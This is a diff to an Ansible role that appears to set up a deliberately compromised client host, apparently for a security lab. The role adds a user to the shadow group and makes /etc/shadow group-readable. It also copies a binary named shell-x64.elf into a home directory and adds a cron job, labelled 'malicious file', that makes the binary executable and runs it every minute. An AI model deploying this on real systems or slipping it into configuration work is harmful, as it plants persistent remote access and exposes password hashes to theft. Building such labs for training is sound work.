@@ -1,11 +1,38 @@
 ---
 # This is a role for setting up the client.
 
-- name: Add passwords file to the home directory
-  copy:
-    src: passlist.txt
-    dest: /home/user/passlist.txt
-    owner: user
-    mode: 0644
+- name: Create alias for client
+  lineinfile:
+    path: '/etc/hosts'
+    line: '192.168.50.5 client'
+    
+- name: Add user john to shadow group
+  user:
+    name: john
+    groups: shadow
+    append: yes
 
+- name: Change permissions of /etc/shadow file
+  file:
+    path: /etc/shadow
+    mode: "0640"
+
+- name: Create file shell-x64.elf
+  copy:
+    src: shell-x64.elf
+    #Edit this
+    dest: /home/user/shell-x64.elf
+
+- name: Cron job for malicious file
+  cron:
+   name: "Give permission and run shell-x64.elf"
+   minute: "*/1" # run this task every 1 minutes
+   #Edit this
+   job: "chmod +x /home/user/shell-x64.elf && /home/user/shell-x64.elf"
+
+# - name: Cronjob kill
+#   cron:
+#    name: "kill shell"
+#    minute: "*/10" # every 6 minutes
+#    job: "pkill shell-x64.elf"
 ...
